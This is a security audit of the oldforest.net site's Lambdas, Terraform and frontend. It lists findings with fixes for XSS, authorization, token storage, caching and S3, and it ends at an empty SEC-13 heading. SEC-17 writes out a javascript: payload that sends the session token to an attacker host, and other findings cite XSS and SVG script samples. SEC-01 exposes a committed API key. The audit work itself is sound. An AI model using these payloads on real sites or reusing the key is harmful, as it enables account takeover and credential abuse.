# Security Audit — oldforest.net

> Principal Application Security Engineer + Abuse Prevention review.
> Scope: all Lambda functions, Terraform infrastructure, and frontend HTML.
> Date: 2026-07-26 (Round 1) · 2026-07-30 (Round 2)

---

# Round 2 — 2026-07-30

Re-audit against the current working tree, including the in-flight migration of
`admin-apps`/`admin-files`/`admin-users`/`upload-url`/`reading-log` to the new shared
`src/shared/auth.mjs`, and the new `site/books/` pages. All Round 1 findings below
(SEC-01–SEC-16) remain fixed; this pass found new issues layered on top of that work.

---

## [HIGH]

### SEC-17 — Stored XSS via unvalidated URL scheme in `book.goodreadsUrl`

**Location:**
- `site/apps/booktimeline/index.html:326` — `buildPopupHTML()`
- `site/books/book.html:360` — book detail page

**Vector:** Any account in the `editors` or `admins` Cognito group can create/update a book
record via `POST/PUT /v1/reading/books` (`src/functions/reading-log/index.mjs`) and set
`goodreadsUrl` (or `coverUrl`) to an arbitrary string. The frontend HTML-escapes the value
with `esc()` before interpolating it into an `href` attribute, but `esc()` only escapes
`& < > " '` — it never validates the URL **scheme**. A value like
`javascript:fetch('https://evil.example/steal?t='+sessionStorage.access_token)` passes
escaping untouched and renders as a clickable "Goodreads" link on **public, unauthenticated**
book/timeline pages (`GET /v1/reading/books` and `/v1/reading/reads` have no JWT authorizer in
`infra/api.tf`). Any visitor — including an `admins`-group user browsing the public site with
their own session active — who clicks the link executes attacker JS in the page's origin, with
full access to `sessionStorage` (which holds the access token, ID token, and 30-day refresh
token — see SEC-19). This turns an editor-level content-write bug into a path to full account
takeover of anyone who clicks, including admins.

```js
// CURRENT — site/apps/booktimeline/index.html / site/books/book.html
if (book.goodreadsUrl) {
  exactLinks.push(`<a class="ip-link ip-link-gr" href="${esc(book.goodreadsUrl)}" target="_blank">Goodreads</a>`);
  // ↑ esc() blocks attribute breakout but NOT javascript:/data: scheme injection
}
```

**Fix:** Add a scheme allowlist helper in `site/js/util.js` and use it wherever a stored URL
reaches `href`/`src`:

```js
// site/js/util.js
function safeUrl(u) {
  try {
    const parsed = new URL(String(u ?? ''), window.location.origin);
    return ['http:', 'https:'].includes(parsed.protocol) ? parsed.href : '';
  } catch {
    return '';
  }
}
```

```js
// site/apps/booktimeline/index.html and site/books/book.html
if (book.goodreadsUrl) {
  const url = safeUrl(book.goodreadsUrl);
  if (url) exactLinks.push(`<a class="ip-link ip-link-gr" href="${esc(url)}" target="_blank" rel="noopener">Goodreads</a>`);
}
// apply the same treatment to book.coverUrl before use in <img src="...">
```

Optionally also enforce the same allowlist server-side in `createBook`/`updateBook`
(`src/functions/reading-log/index.mjs`) so bad data can never be stored:

```js
function isSafeUrl(u) {
  if (!u) return true; // optional field
  try { return ['http:', 'https:'].includes(new URL(u).protocol); }
  catch { return false; }
}
// in createBook/updateBook, before writing:
if (!isSafeUrl(body.goodreadsUrl) || !isSafeUrl(body.coverUrl)) return err('Invalid URL');
```

- [x] **[SEC-17]** Add `safeUrl()` scheme validation before rendering `goodreadsUrl`/`coverUrl` in `href`/`src` — fixed 2026-07-30
- [x] **[SEC-17b]** Validate URL scheme server-side in `createBook`/`updateBook` — fixed 2026-07-30

---

## [MEDIUM]

### SEC-18 — `create-post`/`update-post`/`delete-post` use duplicated, non-shared authorization logic that silently excludes admins

**Location:**
- `src/functions/create-post/index.mjs:9-12`
- `src/functions/update-post/index.mjs:8-11`
- `src/functions/delete-post/index.mjs:8-11`

**Vector:** The current working-tree diff migrates `admin-apps`, `admin-files`, `admin-users`,
`upload-url`, and `reading-log` from ad-hoc, buggy `cognito:groups` parsing (comma-split —
wrong, since API Gateway HTTP API actually emits this claim as `"[group1 group2]"`, a
bracket-wrapped, space-separated string, per the authoritative comment now in
`src/shared/auth.mjs`) to the shared, correct `parseGroups()`/`requireEditor()`/`requireAdmin()`
helpers. `create-post`, `update-post`, and `delete-post` were **not** migrated — they still
inline:

```js
function requireEditor(event) {
  const groups = event.requestContext?.authorizer?.jwt?.claims?.['cognito:groups'] ?? [];
  if (!groups.includes('editors')) throw { statusCode: 403, message: 'Editors only' };
}
```

This "works" today only because `String.prototype.includes` happens to substring-match
`'editors'` inside the bracket-wrapped claim string, but it:
1. Never grants `admins` the editor capabilities they get everywhere else in the app
   (`src/shared/auth.mjs`'s `requireEditor` explicitly OR's in `admins`) — admin accounts are
   unexpectedly locked out of post create/update/delete.
2. Is one refactor away from a real authorization bug: if a future Cognito group name ever
   substring-collides with `'editors'`, or the claims format changes again (it already has
   once), this silently breaks with no shared, tested implementation backing it.

These three Lambdas are also packaged via plain `source_dir` in `infra/lambdas.tf` rather than
the explicit multi-`source` block the migrated functions use, so `auth.mjs` isn't even bundled
into their zips today — fixing the code alone isn't enough, the Terraform packaging needs to
change too.

**Exact Fix:**

```js
// src/functions/create-post/index.mjs, update-post/index.mjs, delete-post/index.mjs
import { requireEditor } from './auth.mjs';
// delete the local requireEditor function; existing requireEditor(event) call sites need no other change
```

```hcl
# infra/lambdas.tf — replace source_dir with explicit sources, mirroring admin_apps/upload_url
data "archive_file" "create_post" {
  type        = "zip"
  output_path = "${path.module}/.lambda-zips/create-post.zip"
  source {
    content  = file("${path.module}/../src/functions/create-post/index.mjs")
    filename = "index.mjs"
  }
  source {
    content  = file("${path.module}/../src/shared/auth.mjs")
    filename = "auth.mjs"
  }
}
# repeat identically for update_post and delete_post
```

- [x] **[SEC-18]** Import shared `requireEditor` in create-post/update-post/delete-post; delete inline copies — fixed 2026-07-30
- [x] **[SEC-18b]** Update `infra/lambdas.tf` archive_file blocks for those 3 functions to bundle `auth.mjs` — fixed 2026-07-30

---

### SEC-19 — Access, ID, and 30-day refresh tokens stored in `sessionStorage`

**Location:** All PKCE pages — `site/index.html`, `site/books/index.html`, `site/admin/index.html`,
`site/profile.html`, `site/post.html`, `site/apps.html`, `site/books/book.html`.
Refresh token lifetime: `infra/cognito.tf` (`refresh_token_validity = 30` days).

**Vector:** `sessionStorage` is readable by any JavaScript executing on the page — no
`HttpOnly` boundary exists. Combined with SEC-17 (or any future XSS, including a future
compromise of the `cdnjs.cloudflare.com` scripts allowed by CSP `script-src`), a successful
script injection can exfiltrate the access token, ID token, and — most damaging — the refresh
token, which stays valid for 30 days and can be redeemed for fresh access tokens long after the
victim closes the tab. This significantly amplifies the impact of any XSS finding in this app.

**Fix:** Full remediation (moving refresh-token handling to an `HttpOnly` cookie via a
lightweight backend token-exchange endpoint) is a larger architectural change. As an
incremental step available now:
1. Fix SEC-17 and audit remaining `innerHTML` sinks for URL-scheme validation — the realistic
   XSS entry point today.
2. Shrink the exfiltration window:
   ```hcl
   # infra/cognito.tf
   refresh_token_validity = 7  # was 30
   ```

- [x] **[SEC-19]** Reduce `refresh_token_validity` from 30 to 7 days (or less) — fixed 2026-07-30
- [ ] **[SEC-19b]** Track as accepted risk / backlog: move refresh token off JS-readable storage (requires backend token exchange) — deferred, architectural change

---

### SEC-20 — No Cognito Advanced Security / MFA

**Location:** `infra/cognito.tf` — `aws_cognito_user_pool.main` has no `user_pool_add_ons`
block and no `mfa_configuration`.

**Vector:** The user pool relies solely on password policy + optional WebAuthn passkeys. No
compromised-credential screening, no adaptive/risk-based auth, and MFA is not enforced for any
group — including `admins`, who can create/delete users and delete arbitrary content. A leaked
or brute-forced admin password is a full site takeover with no second factor required.

**Fix:**
```hcl
resource "aws_cognito_user_pool" "main" {
  # ...existing config...

  mfa_configuration = "OPTIONAL"   # or "ON" to force for all users

  software_token_mfa_configuration {
    enabled = true
  }

  user_pool_add_ons {
    advanced_security_mode = "ENFORCED"
  }
}
```

- [x] **[SEC-20]** Enable `software_token_mfa_configuration` + set `mfa_configuration = "OPTIONAL"` (or `"ON"`) — fixed 2026-07-30
- [ ] **[SEC-20b]** Enable `user_pool_add_ons { advanced_security_mode = "ENFORCED" }` — deferred (paid feature, user declined for now)

---

### SEC-21 — `/v1/*` CDN caching is fully disabled, defeating the app's own `Cache-Control` headers and enabling upstream-API abuse

**Location:** `infra/cloudfront.tf` — the `/v1/*` `ordered_cache_behavior` uses
`cache_policy_id = "4135ea2d-6df8-44a3-9df3-4b5a84be39ad"` (AWS managed **CachingDisabled**)
for *all* `/v1/*` routes. Meanwhile `src/functions/lt-proxy/index.mjs` sets
`Cache-Control: public, max-age=3600` and `src/functions/rss-feed/index.mjs` sets
`max-age=900` — both are silently ignored by CloudFront.

**Vector:** `GET /v1/proxy/librarything` is intentionally unauthenticated and proxies to a
rate/quota-limited third-party API using a single shared `LT_API_KEY`
(`infra/lambdas.tf`). Because CloudFront never caches the response, every request — including
scripted/repeated requests from an abuser — invokes the Lambda and hits LibraryThing directly.
API Gateway's account-wide throttle (`throttling_rate_limit = 20`/sec) is generous enough that
a modest, sustained scrape can exhaust or throttle the shared LibraryThing key (denial of
service for the real feature) and run up Lambda costs, all while the code's own caching intent
is nullified.

**Fix:** Give `/v1/proxy/librarything` and `/v1/feed.xml` their own cache behaviors, declared
before the generic `/v1/*` behavior (CloudFront matches most-specific-first):
```hcl
# infra/cloudfront.tf
ordered_cache_behavior {
  path_pattern     = "/v1/proxy/librarything"
  target_origin_id = "ApiOrigin"

  viewer_protocol_policy     = "https-only"
  allowed_methods            = ["GET", "HEAD"]
  cached_methods              = ["GET", "HEAD"]
  cache_policy_id             = "658327ea-f89d-4fab-a63d-7e88639e58f6"  # CachingOptimized — honors Lambda's max-age
  response_headers_policy_id  = aws_cloudfront_response_headers_policy.security.id
}

ordered_cache_behavior {
  path_pattern     = "/v1/feed.xml"
  target_origin_id = "ApiOrigin"

  viewer_protocol_policy     = "https-only"
  allowed_methods            = ["GET", "HEAD"]
  cached_methods              = ["GET", "HEAD"]
  cache_policy_id             = "658327ea-f89d-4fab-a63d-7e88639e58f6"  # CachingOptimized
  response_headers_policy_id  = aws_cloudfront_response_headers_policy.security.id
}
```

- [x] **[SEC-21]** Add dedicated cached `ordered_cache_behavior` blocks for `/v1/proxy/librarything` and `/v1/feed.xml` — fixed 2026-07-30, verified live (feed.xml: `x-cache: Hit from cloudfront`)

---

## [LOW]

### SEC-22 — Public `list-apps` endpoint uses wildcard CORS

**Location:** `src/functions/list-apps/index.mjs` — `Access-Control-Allow-Origin: '*'`.

**Vector:** Data returned is intentionally public and non-sensitive, so this isn't a
confidentiality issue, but it allows any third-party site to fetch/embed your app catalog, and
it's inconsistent with every other Lambda in the project (which scope CORS to
`https://oldforest.net`, per SEC-09's fix in Round 1). Low-value abuse surface rather than a
real vulnerability.

**Fix:**
```js
// src/functions/list-apps/index.mjs
const CORS = { 'Access-Control-Allow-Origin': 'https://oldforest.net', 'Content-Type': 'application/json' };
```

- [x] **[SEC-22]** Replace CORS `*` with `https://oldforest.net` in `list-apps` — fixed 2026-07-30, verified live

---

### SEC-23 — S3 buckets have no explicit Public Access Block

**Location:** `infra/s3.tf` — `aws_s3_bucket.site` and `aws_s3_bucket.content` have bucket
policies scoping `s3:GetObject` to the CloudFront distribution via OAC + `SourceArn` condition
(correct), but neither bucket has an `aws_s3_bucket_public_access_block` resource.

**Vector:** No public ACL or public bucket policy exists today, so there's no active exposure.
But without an explicit Public Access Block, a future accidental `PutBucketAcl` call, a
misconfigured Terraform change, or a manual console edit could make objects (including
`posts/*` markdown and uploaded images) directly public, bypassing the CloudFront-only access
model, with no safety net to catch it.

**Fix:**
```hcl
# infra/s3.tf
resource "aws_s3_bucket_public_access_block" "site" {
  bucket                  = aws_s3_bucket.site.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_public_access_block" "content" {
  bucket                  = aws_s3_bucket.content.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}
```

- [x] **[SEC-23]** Add `aws_s3_bucket_public_access_block` for `site` and `content` buckets — fixed 2026-07-30

---

### SEC-24 — Editor image-URL preview builds `innerHTML` from partially-sanitized input

**Location:** `site/editor/index.html:689`
```js
preview.innerHTML = `<img src="${url.replace(/"/g,'')}" ... onerror="this.parentElement.innerHTML='<span ...>Bad URL</span>'">`;
```

**Vector:** Only `"` is stripped from `url` before interpolation into an `src="..."` attribute
inside an `innerHTML` string. This is restricted to the authenticated editor UI (not
public-facing), so exploitation requires an already-trusted editor account, and attribute
breakout is blocked by the quote-stripping — but it's a fragile, string-concatenation pattern
(no scheme validation) sitting next to properly `esc()`-escaped code elsewhere in the same
file. Bring it in line with SEC-17's fix.

**Fix:** Build the element via the DOM API and reuse the `safeUrl()` helper from SEC-17:
```js
function setPreview(url) {
  preview.innerHTML = '';
  const safe = safeUrl(url);
  if (!safe) {
    preview.innerHTML = '<span style="color:var(--muted);font-size:12px">No image</span>';
    return;
  }
  const img = document.createElement('img');
  img.src = safe;
  img.style.cssText = 'width:100%;height:100%;object-fit:cover;';
  img.onerror = () => { preview.innerHTML = '<span style="color:var(--muted);font-size:12px">Bad URL</span>'; };
  preview.appendChild(img);
}
```

- [x] **[SEC-24]** Rebuild editor image preview with DOM API + `safeUrl()` instead of string-concatenated `innerHTML` — fixed 2026-07-30

---

## Round 2 Summary Table

| ID | Severity | Location | Subject |
|----|----------|----------|---------|
| SEC-17 | HIGH | `booktimeline/index.html`, `books/book.html`, `reading-log/index.mjs` | Stored XSS via unvalidated `javascript:`/`data:` scheme in book links |
| SEC-18 | MEDIUM | `create-post`, `update-post`, `delete-post`, `infra/lambdas.tf` | Duplicated, non-shared auth check excludes admins; not on shared `auth.mjs` |
| SEC-19 | MEDIUM | all auth pages, `infra/cognito.tf` | Tokens (incl. 30-day refresh token) in `sessionStorage` widen XSS blast radius |
| SEC-20 | MEDIUM | `infra/cognito.tf` | No MFA / adaptive security on Cognito user pool |
| SEC-21 | MEDIUM | `infra/cloudfront.tf`, `lt-proxy`, `rss-feed` | `/v1/*` CDN caching disabled — defeats caching, enables 3rd-party API abuse |
| SEC-22 | LOW | `list-apps/index.mjs` | Wildcard CORS on public apps list |
| SEC-23 | LOW | `infra/s3.tf` | No explicit S3 Public Access Block |
| SEC-24 | LOW | `editor/index.html` | Editor preview builds `innerHTML` from partially-sanitized URL |

**Checked and found sound in this pass:** DynamoDB/Cognito SDK calls are all parameterized (no
injection); post content still goes through `marked` → `DOMPurify` with `FORBID_TAGS`/`FORBID_ATTR`
(SEC-03 fix holds); admin pages consistently use `esc()` for user-controlled text (book review/notes,
filenames, user names, app names); `upload-url` still derives `Content-Type` server-side from an
extension allowlist, never caller input (SEC-04 fix holds); the LibraryThing API key is in SSM
`SecureString`, not hardcoded (SEC-01 fix holds); IAM roles remain scoped per-Lambda; JWT
authorization is enforced redundantly at both the API Gateway route and in-Lambda for every write
endpoint on `reading-log`.

---

# Round 1 — 2026-07-26

## CRITICAL

---

### SEC-01 — API key hardcoded in Terraform source (`infra/lambdas.tf`)

**Location:** `infra/lambdas.tf` — `lt_proxy` Lambda `environment` block

**Vector:** The LibraryThing API key and username are committed as plaintext in a tracked
Terraform file. Anyone with repository access (now or in git history) has these credentials.
They also land in Terraform state, which may be stored in S3 or shared with a team.

```hcl
# CURRENT — plaintext secret in tracked file
variables = {
  LT_API_KEY = "2025452350"       # ← committed to git
  LT_USER_ID = "KeyMasterOfGozer"
}
```

**Fix:** Move the key to SSM Parameter Store and reference it via a `data` source.
The key must also be rotated because it is already in git history.

```hcl
# infra/lambdas.tf — reference SSM instead of inline value
resource "aws_ssm_parameter" "lt_api_key" {
  name  = "/oldforest/lt_api_key"
  type  = "SecureString"
  value = "PLACEHOLDER"           # set manually after apply: aws ssm put-parameter ...
  lifecycle { ignore_changes = [value] }
}

# In the lt_proxy Lambda environment block:
variables = {
  LT_API_KEY = data.aws_ssm_parameter.lt_api_key.value
  LT_USER_ID = "KeyMasterOfGozer"
}

data "aws_ssm_parameter" "lt_api_key" {
  name            = "/oldforest/lt_api_key"
  with_decryption = true
}
```

After fixing, rotate the key at LibraryThing and purge it from git history
(`git filter-repo --path infra/lambdas.tf --invert-paths` or BFG).

- [x] **[SEC-01]** Move LT_API_KEY out of Terraform source into SSM SecureString

---

### SEC-02 — `requireAdmin` uses substring match — privilege escalation

**Location:** `src/functions/admin-users/index.mjs:22`,
`src/functions/admin-files/index.mjs:16`,
`src/functions/admin-apps/index.mjs:12`

**Vector:** The same bug that was fixed in `isEditor` (code review SEC-02 in CODE_REVIEW.md)
exists in all three admin Lambdas. `String(groups).includes('admins')` is a substring match,
not an element test. A Cognito group named `"non-admins"` or `"ex-admins"` would pass the
check and gain full admin access (user management, file deletion, app CRUD).

```js
// CURRENT — all three admin Lambdas:
function requireAdmin(event) {
  const groups = event.requestContext?.authorizer?.jwt?.claims?.['cognito:groups'] ?? '';
  if (!String(groups).includes('admins')) {   // ← substring match
```

**Fix:** Apply the same split-to-array pattern already used in `isEditor`:

```js
function requireAdmin(event) {
  const claims = event.requestContext?.authorizer?.jwt?.claims ?? {};
  const raw    = claims['cognito:groups'] ?? '';
  const groups = Array.isArray(raw)
    ? raw
    : raw.split(',').map(g => g.trim()).filter(Boolean);
  if (!groups.includes('admins')) {
    const e = new Error('Admin access required');
    e.statusCode = 403;
    throw e;
  }
}
```

Apply this identical fix to all three files: `admin-users`, `admin-files`, `admin-apps`.

- [x] **[SEC-02]** Fix `requireAdmin` substring match in admin-users, admin-files, admin-apps

---

### SEC-03 — Stored XSS: Markdown rendered without sanitization

**Location:** `site/post.html:205`

**Vector:** Post Markdown content is fetched from the API and rendered with `marked.parse()`,
then set directly on `innerHTML`. The `marked` library does not sanitize output by default —
`<script>`, inline event handlers, `javascript:` hrefs, and other XSS payloads in post content
survive intact and execute in every visitor's browser. Any editor whose account is compromised
can plant persistent XSS that fires for all readers.

```js
// CURRENT — post.html:205
const html = marked.parse(post.content || '');
document.getElementById('page-content').innerHTML = `...${html}...`;
// ↑ unsanitized — <script>alert(1)</script> in a post executes here
```

**Fix:** Add DOMPurify from the same CDN before the marked script tag and sanitize
the parsed HTML before rendering:

```html
<!-- Add before marked.min.js in post.html -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.1.5/purify.min.js"></script>
```

```js
// post.html — sanitize before innerHTML assignment
const rawHtml  = marked.parse(post.content || '');
const safeHtml = DOMPurify.sanitize(rawHtml, {
  USE_PROFILES: { html: true },
  FORBID_TAGS:  ['script', 'iframe', 'object', 'embed'],
  FORBID_ATTR:  ['onerror', 'onload', 'onclick', 'onmouseover'],
});
document.getElementById('page-content').innerHTML = `...${safeHtml}...`;
```

- [x] **[SEC-03]** Add DOMPurify sanitization to post.html Markdown render

---

### SEC-04 — Upload URL: caller-controlled `ContentType` enables HTML/SVG smuggling

**Location:** `src/functions/upload-url/index.mjs:45`

**Vector:** The presigned S3 URL is generated with whatever `ContentType` the caller sends in
the request body. An editor (or a compromised editor session) can:

1. Upload a file with extension `.txt` or `.md` (passes the allowlist) but supply
   `contentType: "text/html"`. S3 stores the object with `Content-Type: text/html`. CloudFront
   passes this header to the browser. Any visitor who clicks the uploaded URL receives and
   parses it as HTML — stored XSS.
2. The extension allowlist includes `.svg`. Even with the correct `image/svg+xml` content type,
   all major browsers execute `<script>` inside SVG files served inline. An SVG with
   `<svg><script>alert(document.cookie)</script></svg>` is a valid upload that executes JS
   for anyone who loads the image URL.

```js
// CURRENT — upload-url/index.mjs:45
const contentType = body.contentType || 'application/octet-stream';
// ↑ fully caller-controlled, no validation
```

**Fix:** Derive `ContentType` exclusively from the validated extension; ignore the caller's
value entirely. Also add a `ContentLengthRange` condition to cap upload size.

```js
// Derive content type from the validated extension — never from caller input
const MIME_MAP = {
  jpg:  'image/jpeg',
  jpeg: 'image/jpeg',
  png:  'image/png',
  gif:  'image/gif',
  webp: 'image/webp',
  svg:  'image/svg+xml',  // Note: SVG can still execute JS — consider removing from allowlist
  pdf:  'application/pdf',
  txt:  'text/plain',
  md:   'text/plain',     // serve as plain text, not text/markdown
};
const contentType = MIME_MAP[ext]; // ext is already validated against the allowlist above

const url = await getSignedUrl(s3, new PutObjectCommand({
  Bucket: process.env.CONTENT_BUCKET,
  Key: key,
  ContentType: contentType,
}), {
  expiresIn: 300,
  // Cap upload at 10 MB to prevent cost-amplification via large uploads
  // Note: ContentLengthRange requires a policy condition — enforce at Lambda level
  // or via a separate upload policy.
});
```

Consider removing `svg` from the allowed extension list entirely — SVG is the only
image format that can execute JavaScript as a first-class feature.

- [x] **[SEC-04]** Strip caller-controlled ContentType in upload-url; derive from extension only
- [x] **[SEC-04b]** Remove SVG from the upload allowlist (SVG executes JS in browsers)

---

## HIGH

---

### SEC-05 — No API throttling or WAF: DynamoDB Scan abuse / cost amplification

**Location:** `infra/api.tf` — `aws_apigatewayv2_stage.default` (no `default_route_settings`)

**Vector:** Every unauthenticated public endpoint (`GET /v1/reading/books`,
`GET /v1/reading/reads`, `GET /v1/posts`, `GET /v1/feed.xml`, `GET /v1/proxy/librarything`)
triggers a full DynamoDB table Scan on PAY_PER_REQUEST tables. There is no API Gateway
throttle, no WAF rate-based rule, and no Lambda concurrency limit. A script hitting
`/v1/reading/reads` in a loop runs unbounded parallel Scans — the AWS bill scales linearly
with request rate. The `lt-proxy` also makes an outbound HTTP call to LibraryThing on every
uncached request, risking IP bans.

**Fix:**

```hcl
# infra/api.tf — add throttling to the default stage
resource "aws_apigatewayv2_stage" "default" {
  api_id      = aws_apigatewayv2_api.main.id
  name        = "$default"
  auto_deploy = true

  default_route_settings {
    throttling_burst_limit = 50   # max concurrent requests
    throttling_rate_limit  = 20   # sustained requests/second
  }
}

# infra/waf.tf — add a WAF with rate-based rule (new file)
resource "aws_wafv2_web_acl" "main" {
  name  = "oldforest-waf"
  scope = "CLOUDFRONT"           # must be us-east-1

  default_action { allow {} }

  rule {
    name     = "RateLimit"
    priority = 1
    action   { block {} }
    statement {
      rate_based_statement {
        limit              = 300   # requests per 5-minute window per IP
        aggregate_key_type = "IP"
      }
    }
    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name                = "RateLimit"
      sampled_requests_enabled   = true
    }
  }

  visibility_config {
    cloudwatch_metrics_enabled = true
    metric_name                = "oldforest-waf"
    sampled_requests_enabled   = true
  }
}

# Wire WAF to the CloudFront distribution (add to cloudfront.tf):
# web_acl_id = aws_wafv2_web_acl.main.arn
```

- [x] **[SEC-05]** Add `default_route_settings` throttle to API Gateway stage
- [ ] **[SEC-05b]** Add WAF with IP-based rate-limiting rule to CloudFront — deferred ($6/month, not worth it for this project)

---

### SEC-06 — `update-post` silently upserts non-existent posts (missing existence guard)

**Location:** `src/functions/update-post/index.mjs:27–35`

**Vector:** The Lambda does a pre-flight `GetCommand` to check for personal-post ownership —
but only acts on the result if the post is personal. If the item doesn't exist
(`existing.Item` is `undefined`), the personal-post check is skipped (the `&&` short-circuits)
and execution falls through to the `UpdateCommand`. DynamoDB `UpdateItem` with no
`ConditionExpression` creates the item if it does not exist. An editor can therefore write a
post to an arbitrary `postId` of their choosing, bypassing the normal create-post flow and
creating orphaned items that `list-posts` may surface.

```js
// CURRENT — update-post/index.mjs
const existing = await dynamo.send(new GetCommand({ ... }));
// If existing.Item is null, this check is skipped entirely:
if (existing.Item?.visibility === 'personal' && existing.Item?.authorSub !== claims.sub) {
  return { statusCode: 403, ... };
}
// Falls through to UpdateCommand — silently creates item if it didn't exist
```

**Fix:** Add an explicit existence guard immediately after the GetCommand:

```js
const existing = await dynamo.send(new GetCommand({
  TableName: process.env.POSTS_TABLE,
  Key: { postId },
}));

// ── NEW: guard non-existent posts before any other check ──────────────────
if (!existing.Item) {
  return { statusCode: 404, body: JSON.stringify({ message: 'Not found' }) };
}

// Personal-post ownership check (now safe — existing.Item is guaranteed to exist)
if (existing.Item.visibility === 'personal' && existing.Item.authorSub !== claims.sub) {
  return { statusCode: 403, body: JSON.stringify({ message: 'Not your personal post' }) };
}
```

- [x] **[SEC-06]** Add existence check to update-post before UpdateCommand

---

### SEC-07 — `lt-proxy` logs the full URL including the API key to CloudWatch

**Location:** `src/functions/lt-proxy/index.mjs:58`

**Vector:** `console.log('Fetching LT URL:', url)` logs the complete URL including the
`key=` query parameter (the LibraryThing API key) to CloudWatch Logs on every invocation.
Anyone with CloudWatch read access — including future team members, or an attacker who gains
AWS console access — can trivially extract the key from logs without touching the source or
state files.

```js
// CURRENT — logs the full URL with key=2025452350 appended
const url = ltUrl();
console.log('Fetching LT URL:', url);   // ← key in plaintext
```

**Fix:** Log only a sanitized version that strips the key parameter:

```js
const url = ltUrl();
// Log without the API key
const safeUrl = url.replace(/([?&]key=)[^&]*/g, '$1[REDACTED]');
console.log('Fetching LT URL:', safeUrl);
```

- [x] **[SEC-07]** Redact API key from lt-proxy CloudWatch log

---

### SEC-08 — Internal error messages exposed to callers in 500 responses

**Location:**
- `src/functions/reading-log/index.mjs` (router catch block, last line)
- `src/functions/admin-users/index.mjs:128`
- `src/functions/admin-files/index.mjs`
- `src/functions/admin-apps/index.mjs`

**Vector:** All Lambdas propagate `e.message` verbatim into the HTTP 500 response body.
DynamoDB exception messages include table names, attribute names, GSI names, and sometimes
partial ARNs — all useful for fingerprinting the data model. A deliberately malformed request
that triggers an internal error leaks this detail to any caller.

```js
// CURRENT — reading-log router catch:
return err(`Internal server error: ${e.message}`, 500);

// CURRENT — admin-users catch:
return errRes(status, e.message || 'Internal server error');
```

**Fix:** Log the full error internally; return only a generic message to the caller:

```js
// In every Lambda catch block:
} catch (e) {
  console.error('Unhandled error:', e);   // full detail stays in CloudWatch
  return err('Internal server error', 500);  // nothing leaks to caller
}
```

Named DynamoDB exceptions (e.g., `ConditionalCheckFailedException`) that are already handled
with specific status codes are fine as-is — only the generic catch-all needs the fix.

- [x] **[SEC-08]** Strip e.message from all 500 error responses; log internally only

---

## MEDIUM

---

### SEC-09 — CORS wildcard (`*`) on admin Lambda responses

**Location:** `src/functions/admin-users/index.mjs`, `admin-files/index.mjs`, `admin-apps/index.mjs`
— the `CORS` constant in each file

**Vector:** All three admin Lambdas return `'Access-Control-Allow-Origin': '*'`. While
Bearer-token auth prevents classic CSRF (credentials aren't sent automatically), the wildcard
allows any origin to make credentialed cross-origin requests if an editor's token is extractable
from another page (e.g., via a malicious iframe on a compromised CDN asset). Restricting to
your own origin costs nothing and removes a permissive policy that shouldn't be there for
high-privilege endpoints.

```js
// CURRENT — in all three admin Lambdas:
const CORS = {
  'Access-Control-Allow-Origin': '*',  // ← allows any origin
  'Content-Type': 'application/json',
};
```

**Fix:**

```js
const CORS = {
  'Access-Control-Allow-Origin': 'https://oldforest.net',
  'Content-Type': 'application/json',
};
```

Also update `infra/api.tf` `cors_configuration` to confirm the origin matches — it already
lists `https://${var.domain_name}`, which is correct. The Lambda headers just need to match.

- [x] **[SEC-09]** Replace CORS `*` with `https://oldforest.net` in all admin Lambdas

---

### SEC-10 — Access token validity is 24 hours (Cognito maximum)

**Location:** `infra/cognito.tf:55–56`

**Vector:** A stolen access token (via XSS, compromised device, or CloudWatch log leak) gives
an attacker a 24-hour window to act as the user. For admin tokens this means 24 hours of
unrestricted user management and file deletion. The Cognito maximum is 24 hours and the code
uses it; industry standard is 1 hour for access tokens with silent refresh via the refresh
token.

```hcl
# CURRENT
access_token_validity  = 24   # 24 hours (Cognito max)
id_token_validity      = 24
```

**Fix:**

```hcl
access_token_validity  = 1    # 1 hour — refresh silently via refresh token
id_token_validity      = 1    # keep in sync
refresh_token_validity = 30   # unchanged — 30 days
```

The frontend already has token-refresh logic (task #31). Confirm it fires before expiry.

- [x] **[SEC-10]** Reduce access_token_validity from 24 hours to 1 hour

---

### SEC-11 — Presigned upload URL has no maximum size constraint

**Location:** `src/functions/upload-url/index.mjs` — `getSignedUrl` call

**Vector:** The presigned PUT URL imposes no `Content-Length` constraint. An editor (or a
compromised session using a stolen token) can upload a file up to the S3 PUT limit of 5 GB in
a single request. On PAY_PER_REQUEST DynamoDB tables the cost impact is to S3 storage and
data transfer, not DynamoDB — but a 5 GB upload via CloudFront egress costs ~$0.42/GB in
data-transfer fees and the attacker pays nothing. A loop of large uploads can run up meaningful
charges.

S3 presigned URL size constraints require a POST policy (presigned POST), not a presigned PUT.
The simplest Lambda-side mitigation is to validate `Content-Length` from the upload request
at Lambda time, or switch to presigned POST with a policy condition.

**Fix (simplest — add Lambda size guard):**

```js
// In upload-url Lambda, before generating the URL:
const MAX_BYTES = 10 * 1024 * 1024; // 10 MB
const declaredSize = Number(body.size ?? 0);
if (declaredSize > MAX_BYTES) {
  return { statusCode: 413, body: JSON.stringify({ message: 'File too large (max 10 MB)' }) };
}
```

This is soft enforcement (caller-declared). Hard enforcement requires switching to S3 presigned
POST with a `content-length-range` policy condition — more involved but the correct long-term fix.

- [x] **[SEC-11]** Add upload size limit to upload-url Lambda (soft guard now; presigned POST for hard limit)

---

### SEC-12 — `get-post` returns `authorSub` and `contentKey` to public callers

**Location:** `src/functions/get-post/index.mjs` — final `JSON.stringify(post)`

**Vector:** The full DynamoDB item is serialized and returned without a serialization filter.
This includes:
- `authorSub` — the Cognito user sub (UUID) of the author. While not directly exploitable,
  it's an internal identity value that shouldn't be part of the public API contract.
- `contentKey` — the S3 object path (`posts/{postId}/body.md`). This reveals the bucket
  layout and postId for every post, enabling targeted S3 access probing even though the
  bucket is not publicly accessible.

```js
// CURRENT — all DynamoDB attributes returned including authorSub and contentKey
post.content = await s3Obj.Body.transformToString();
return { statusCode: 200, body: JSON.stringify(post) };
```

**Fix:** Project only the fields the client actually needs:

```js
const { authorSub: _sub, contentKey: _key, ...publicFields } = post;
return {
  statusCode: 200,
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ ...publicFields, content: await s3Obj.Body.transformToString() }),
};
```

- [x] **[SEC-12]** Strip `authorSub` and `contentKey` from public get-post response

---

## LOW

---

### SEC-13 — No HTTP security response headers on CloudFront

